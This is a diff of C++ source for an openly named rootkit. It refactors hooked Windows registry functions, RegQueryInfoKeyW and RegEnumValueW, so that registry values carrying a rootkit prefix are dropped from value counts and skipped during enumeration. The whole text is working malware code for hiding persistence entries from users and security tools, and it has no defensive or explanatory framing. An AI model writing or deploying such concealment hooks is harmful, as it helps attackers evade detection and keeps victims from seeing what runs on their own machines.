@@ -89,35 +89,29 @@ NTSTATUS Rootkit::HookedZwQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PI
 }
 NTSTATUS Rootkit::HookedRegQueryInfoKeyW(HKEY hKey, PWSTR pClass, PDWORD pcClass, PDWORD pReserved, PDWORD pcSubKeys, PDWORD pcMaxSubKeyLen, PDWORD pcMaxClassLen, PDWORD pcValues, PDWORD pcMaxValueNameLen, PDWORD pcMaxValueLen, PULONG pulSecDescLen, PFILETIME pftLastWriteTime)
 {
-	DWORD subKeyCount;
-	DWORD valueCount;
-	DWORD maxValueDataSize;
-	DWORD newValueCount = 0;
+	NTSTATUS status = OriginalRegQueryInfoKeyW(hKey, pClass, pcClass, pReserved, pcSubKeys, pcMaxSubKeyLen, pcMaxClassLen, pcValues, pcMaxValueNameLen, pcMaxValueLen, pulSecDescLen, pftLastWriteTime);;
 
-	if (RegistryQueryInfoKey(hKey, subKeyCount, valueCount, maxValueDataSize) && valueCount > 0)
+	if (status == ERROR_SUCCESS && pcValues != NULL && *pcValues > 0)
 	{
-		newValueCount = valueCount;
+		DWORD valueCount = *pcValues;
 		WCHAR name[16383];
 
-		for (DWORD i = 0; i < valueCount; i++)
+		for (DWORD i = 0; i < *pcValues; i++)
 		{
 			DWORD nameSize = 16383;
 			name[0] = L'\0';
-			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS &&
+				RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS &&
+				wstring(name).find(ROOTKIT_PREFIX) == 0)
 			{
-				DWORD lpData = maxValueDataSize;
-				if (RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS && lstrlenW(name) > 0)
-				{
-					if (wstring(name).find(ROOTKIT_PREFIX) == 0)
-					{
-						newValueCount--;
-					}
-				}
+				valueCount--;
 			}
 		}
+
+		*pcValues = valueCount;
 	}
 
-	return OriginalRegQueryInfoKeyW(hKey, pClass, pcClass, pReserved, pcSubKeys, pcMaxSubKeyLen, pcMaxClassLen, &newValueCount, pcMaxValueNameLen, pcMaxValueLen, pulSecDescLen, pftLastWriteTime);
+	return status;
 }
 NTSTATUS Rootkit::HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, PWSTR pValueName, PDWORD pcchValueName, PDWORD pReserved, PDWORD pType, PBYTE pData, PDWORD pcbData)
 {
@@ -133,16 +127,11 @@ NTSTATUS Rootkit::HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, PWSTR pValueName
 		{
 			DWORD nameSize = 16383;
 			name[0] = L'\0';
-			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS &&
+				RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS &&
+				wstring(name).find(ROOTKIT_PREFIX) == 0)
 			{
-				DWORD lpData = maxValueDataSize;
-				if (RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS && lstrlenW(name) > 0)
-				{
-					if (wstring(name).find(ROOTKIT_PREFIX) == 0)
-					{
-						dwIndex++;
-					}
-				}
+				dwIndex++;
 			}
 		}
 	}
